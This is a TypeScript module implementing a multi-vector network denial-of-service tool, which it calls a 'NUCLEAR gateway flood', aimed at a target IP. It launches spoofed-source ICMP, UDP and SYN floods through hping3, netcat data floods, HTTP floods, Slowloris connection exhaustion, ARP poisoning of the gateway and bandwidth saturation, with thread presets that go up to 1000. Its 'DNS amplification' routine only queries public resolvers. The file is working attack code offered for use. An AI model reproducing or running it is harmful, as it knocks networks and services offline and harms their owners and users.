import { exec } from './exec';

export interface FloodConfig {
  targetIp: string;
  interface: string;
  intensity?: 'low' | 'medium' | 'high' | 'extreme' | 'nuclear';
}

/**
 * Start NUCLEAR gateway flood attack
 * This will COMPLETELY DESTROY any network
 */
export async function startGatewayFlood(config: FloodConfig): Promise<void> {
  const { targetIp, interface: iface, intensity = 'high' } = config;

  console.log('  Starting NUCLEAR gateway flood attack...');
  
  const params = getIntensityParams(intensity);
  
  try {
    // === METHOD 1: ICMP FLOOD (Multi-threaded) ===
    console.log(`  [1/8] Launching ICMP flood (${params.icmpThreads} threads, ${params.packetSize} bytes)...`);
    
    if (await commandExists('hping3')) {
      // Launch multiple hping3 instances for maximum brutality
      for (let i = 0; i < params.icmpThreads; i++) {
        await exec(
          `hping3 -1 --flood --rand-source -d ${params.packetSize} ${targetIp} &> /dev/null &`,
          { ignoreError: true }
        );
      }
    } else {
      // Fallback: aggressive ping flood
      for (let i = 0; i < Math.min(params.icmpThreads, 10); i++) {
        await exec(`ping -f -s 65500 ${targetIp} &> /dev/null &`, { ignoreError: true });
      }
    }

    // === METHOD 2: UDP FLOOD (Multi-port, Multi-threaded) ===
    console.log(`  [2/8] Launching UDP flood (${params.udpThreads} threads, 50+ ports)...`);
    
    // Target ports: DNS, NTP, SNMP, LDAP, mDNS, memcached, etc.
    const udpPorts = [53, 123, 161, 389, 5353, 11211, 1900, 3702, 137, 138, 445, 
                      514, 520, 1434, 27015, 27960, 19132, 6881, 6889];
    
    if (await commandExists('hping3')) {
      for (let i = 0; i < params.udpThreads; i++) {
        const targetPorts = udpPorts.slice(i % 5, (i % 5) + 5).join(',');
        await exec(
          `hping3 --udp --flood --rand-source -p ${targetPorts} ${targetIp} &> /dev/null &`,
          { ignoreError: true }
        );
      }
    }
    
    // Additional UDP flood using raw sockets
    await startRawUDPFlood(targetIp, udpPorts, params.udpThreads);

    // === METHOD 3: SYN FLOOD (Connection Exhaustion) ===
    console.log(`  [3/8] Launching SYN flood (${params.synThreads} threads)...`);
    
    const synPorts = [80, 443, 8080, 8443, 22, 21, 23, 25, 110, 143, 3389, 5900];
    
    if (await commandExists('hping3')) {
      for (let i = 0; i < params.synThreads; i++) {
        const targetPort = synPorts[i % synPorts.length];
        await exec(
          `hping3 -S --flood --rand-source -p ${targetPort} ${targetIp} &> /dev/null &`,
          { ignoreError: true }
        );
      }
    }
    
    // Fallback: nmap aggressive scan
    for (let i = 0; i < Math.min(5, params.synThreads); i++) {
      await exec(
        `nmap -sS --max-rate 100000 --min-rate 50000 -p- ${targetIp} &> /dev/null &`,
        { ignoreError: true }
      );
    }

    // === METHOD 4: DNS AMPLIFICATION ===
    console.log(`  [4/8] Launching DNS amplification attack...`);
    await startDNSAmplification(targetIp, params.dnsThreads);

    // === METHOD 5: HTTP/HTTPS FLOOD ===
    console.log(`  [5/8] Launching HTTP/HTTPS flood (${params.httpThreads} threads)...`);
    await startHTTPFlood(targetIp, params.httpThreads);

    // === METHOD 6: SLOWLORIS (Connection Exhaustion) ===
    console.log(`  [6/8] Launching Slowloris connection exhaustion...`);
    await startSlowloris(targetIp, params.slowlorisConnections);

    // === METHOD 7: ARP CHAOS (Network Confusion) ===
    console.log(`  [7/8] Launching ARP chaos (network-wide poisoning)...`);
    await startArpChaos(targetIp, iface, params.arpThreads);

    // === METHOD 8: RAW BANDWIDTH SATURATION ===
    console.log(`  [8/8] Launching raw bandwidth saturation (${params.bandwidthThreads} threads)...`);
    await startRawBandwidthSaturation(targetIp, params.bandwidthThreads);

    console.log(`\n  ✅ NUCLEAR ATTACK DEPLOYED!`);
    console.log(`  ✅ Total attack threads: ${params.totalThreads}`);
    console.log(`  ✅ Estimated packet rate: ${params.estimatedPPS} packets/sec`);
    console.log(`  ✅ Intensity: ${intensity.toUpperCase()}\n`);
    
  } catch (error) {
    throw new Error(`Nuclear flood failed: ${error}`);
  }
}

/**
 * Raw UDP flood using netcat and bash loops
 */
async function startRawUDPFlood(targetIp: string, ports: number[], threads: number): Promise<void> {
  for (let i = 0; i < threads; i++) {
    const port = ports[i % ports.length];
    const script = `
      while true; do
        dd if=/dev/urandom bs=65000 count=1 2>/dev/null | nc -u -w0 ${targetIp} ${port} 2>/dev/null
      done
    `;
    await exec(`bash -c '${script}' &> /dev/null &`, { ignoreError: true });
  }
}

/**
 * DNS Amplification attack
 */
async function startDNSAmplification(_targetIp: string, threads: number): Promise<void> {
  // Public DNS servers for amplification
  const dnsServers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '208.67.222.222', '208.67.220.220'];
  
  // DNS query types that generate large responses
  const queryTypes = ['ANY', 'TXT', 'MX', 'SOA', 'AAAA'];
  const domains = ['google.com', 'facebook.com', 'youtube.com', 'amazon.com', 'twitter.com'];
  
  for (let i = 0; i < threads; i++) {
    const dnsServer = dnsServers[i % dnsServers.length];
    const queryType = queryTypes[i % queryTypes.length];
    const domain = domains[i % domains.length];
    
    const script = `
      while true; do
        dig @${dnsServer} ${domain} ${queryType} +short &> /dev/null
        sleep 0.001
      done
    `;
    await exec(`bash -c '${script}' &> /dev/null &`, { ignoreError: true });
  }
}

/**
 * Aggressive HTTP/HTTPS flood
 */
async function startHTTPFlood(targetIp: string, threads: number): Promise<void> {
  const paths = ['/', '/index.html', '/admin', '/login', '/api', '/search', '/images', '/scripts'];
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)',
  ];
  
  for (let i = 0; i < threads; i++) {
    const path = paths[i % paths.length];
    const userAgent = userAgents[i % userAgents.length];
    
    const script = `
      while true; do
        curl -s -A "${userAgent}" -m 0.5 http://${targetIp}${path} &> /dev/null || true
        curl -s -A "${userAgent}" -m 0.5 --insecure https://${targetIp}${path} &> /dev/null || true
        
        # Rapid-fire requests without waiting
        for j in {1..10}; do
          (echo -e "GET ${path} HTTP/1.1\\r\\nHost: ${targetIp}\\r\\n\\r\\n"; sleep 0.01) | nc -w1 ${targetIp} 80 &> /dev/null || true
        done
      done
    `;
    await exec(`bash -c '${script}' &> /dev/null &`, { ignoreError: true });
  }
}

/**
 * Slowloris attack - exhaust connection pool
 */
async function startSlowloris(targetIp: string, connections: number): Promise<void> {
  const script = `
    for i in {1..${connections}}; do
      (
        # Open connection and keep it alive
        (
          echo -e "GET / HTTP/1.1\\r\\nHost: ${targetIp}\\r\\n"
          while true; do
            echo -e "X-a: b\\r\\n"
            sleep 10
          done
        ) | nc ${targetIp} 80 &> /dev/null
      ) &
    done
  `;
  await exec(`bash -c '${script}' &> /dev/null &`, { ignoreError: true });
}

/**
 * Aggressive ARP chaos
 */
async function startArpChaos(gatewayIp: string, iface: string, threads: number): Promise<void> {
  for (let i = 0; i < threads; i++) {
    const script = `
      while true; do
        # Broadcast fake ARP - tell everyone gateway is at fake MAC
        arping -c 1 -A -I ${iface} -s ${gatewayIp} -S de:ad:be:ef:00:0${i % 10} 255.255.255.255 2>/dev/null || true
        
        # Also poison specific gateway entry
        arping -c 1 -A -I ${iface} -s ${gatewayIp} ${gatewayIp} 2>/dev/null || true
        
        sleep 0.05
      done
    `;
    await exec(`bash -c '${script}' &> /dev/null &`, { ignoreError: true });
  }
}

/**
 * Raw bandwidth saturation
 */
async function startRawBandwidthSaturation(targetIp: string, threads: number): Promise<void> {
  for (let i = 0; i < threads; i++) {
    const script = `
      while true; do
        # Method 1: dd + netcat (HTTP)
        dd if=/dev/zero bs=1M count=100 2>/dev/null | nc -w1 ${targetIp} 80 2>/dev/null || true
        
        # Method 2: dd + netcat (HTTPS)
        dd if=/dev/urandom bs=1M count=50 2>/dev/null | nc -w1 ${targetIp} 443 2>/dev/null || true
        
        # Method 3: Yes spam
        yes "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | head -c 10M | nc -w1 ${targetIp} 80 2>/dev/null || true
        
        # Method 4: Rapid small packets
        for j in {1..1000}; do
          echo "FLOOD" | nc -w0 ${targetIp} 80 2>/dev/null || true
        done
      done
    `;
    await exec(`bash -c '${script}' &> /dev/null &`, { ignoreError: true });
  }
}

/**
 * Get NUCLEAR intensity parameters
 */
function getIntensityParams(intensity: string): {
  rate: number;
  packetSize: number;
  icmpThreads: number;
  udpThreads: number;
  synThreads: number;
  httpThreads: number;
  dnsThreads: number;
  arpThreads: number;
  bandwidthThreads: number;
  slowlorisConnections: number;
  totalThreads: number;
  estimatedPPS: number;
} {
  switch (intensity) {
    case 'low':
      return { 
        rate: 1000, packetSize: 1000, 
        icmpThreads: 2, udpThreads: 2, synThreads: 2, httpThreads: 3,
        dnsThreads: 2, arpThreads: 1, bandwidthThreads: 3, slowlorisConnections: 50,
        totalThreads: 15, estimatedPPS: 5000
      };
    case 'medium':
      return { 
        rate: 5000, packetSize: 5000,
        icmpThreads: 5, udpThreads: 5, synThreads: 5, httpThreads: 10,
        dnsThreads: 5, arpThreads: 3, bandwidthThreads: 10, slowlorisConnections: 100,
        totalThreads: 43, estimatedPPS: 50000
      };
    case 'high':
      return { 
        rate: 10000, packetSize: 10000,
        icmpThreads: 10, udpThreads: 10, synThreads: 10, httpThreads: 20,
        dnsThreads: 10, arpThreads: 5, bandwidthThreads: 20, slowlorisConnections: 200,
        totalThreads: 85, estimatedPPS: 150000
      };
    case 'extreme':
      return { 
        rate: 50000, packetSize: 65000,
        icmpThreads: 25, udpThreads: 25, synThreads: 25, httpThreads: 50,
        dnsThreads: 25, arpThreads: 10, bandwidthThreads: 50, slowlorisConnections: 500,
        totalThreads: 210, estimatedPPS: 500000
      };
    case 'nuclear':
      return { 
        rate: 1000000, packetSize: 150000,
        icmpThreads: 100, udpThreads: 100, synThreads: 100, httpThreads: 200,
        dnsThreads: 100, arpThreads: 50, bandwidthThreads: 200, slowlorisConnections: 5000,
        totalThreads: 1000, estimatedPPS: 500000
      };
    default:
      return { 
        rate: 10000, packetSize: 10000,
        icmpThreads: 10, udpThreads: 10, synThreads: 10, httpThreads: 20,
        dnsThreads: 10, arpThreads: 5, bandwidthThreads: 20, slowlorisConnections: 200,
        totalThreads: 85, estimatedPPS: 150000
      };
  }
}

/**
 * Check if command exists
 */
async function commandExists(cmd: string): Promise<boolean> {
  try {
    await exec(`which ${cmd}`, { ignoreError: true });
    return true;
  } catch {
    return false;
  }
}

/**
 * Stop gateway flood attack
 */
export async function stopGatewayFlood(): Promise<void> {
  console.log('  Stopping NUCLEAR flood...');
  
  try {
    // Kill all attack processes
    await exec('pkill -9 hping3', { ignoreError: true });
    await exec('pkill -9 ping', { ignoreError: true });
    await exec('pkill -9 -f "dd if=/dev"', { ignoreError: true });
    await exec('pkill -9 -f "nc.*[0-9]"', { ignoreError: true });
    await exec('pkill -9 curl', { ignoreError: true });
    await exec('pkill -9 nmap', { ignoreError: true });
    await exec('pkill -9 dig', { ignoreError: true });
    await exec('pkill -9 arping', { ignoreError: true });
    await exec('killall -9 bash 2>/dev/null', { ignoreError: true });
    
    console.log('  ✓ NUCLEAR flood stopped');
  } catch (error) {
    console.error('  Warning: Some processes may still be running');
  }
}

/**
 * Check if flood tools are available
 */
export async function checkFloodTools(): Promise<{
  hping3: boolean;
  curl: boolean;
  nc: boolean;
  dig: boolean;
  arping: boolean;
  nmap: boolean;
}> {
  const checkCommand = async (cmd: string): Promise<boolean> => {
    try {
      await exec(`which ${cmd}`);
      return true;
    } catch {
      return false;
    }
  };

  return {
    hping3: await checkCommand('hping3'),
    curl: await checkCommand('curl'),
    nc: await checkCommand('nc'),
    dig: await checkCommand('dig'),
    arping: await checkCommand('arping'),
    nmap: await checkCommand('nmap'),
  };
}

/**
 * Monitor flood effectiveness
 */
export async function monitorFlood(targetIp: string): Promise<{
  cpuLoad: number;
  packetRate: number;
  responseTime: number;
}> {
  try {
    const start = Date.now();
    await exec(`ping -c 1 -W 2 ${targetIp}`, { ignoreError: true });
    const responseTime = Date.now() - start;

    const { stdout } = await exec('cat /proc/net/dev | grep wlan', { ignoreError: true });
    const match = stdout.match(/\s+(\d+)\s+(\d+)/);
    const packets = match ? parseInt(match[1] || '0') : 0;

    const { stdout: loadAvg } = await exec('cat /proc/loadavg');
    const cpuLoad = parseFloat(loadAvg.split(' ')[0] || '0');

    return { cpuLoad, packetRate: packets, responseTime };
  } catch {
    return { cpuLoad: 0, packetRate: 0, responseTime: 9999 };
  }
}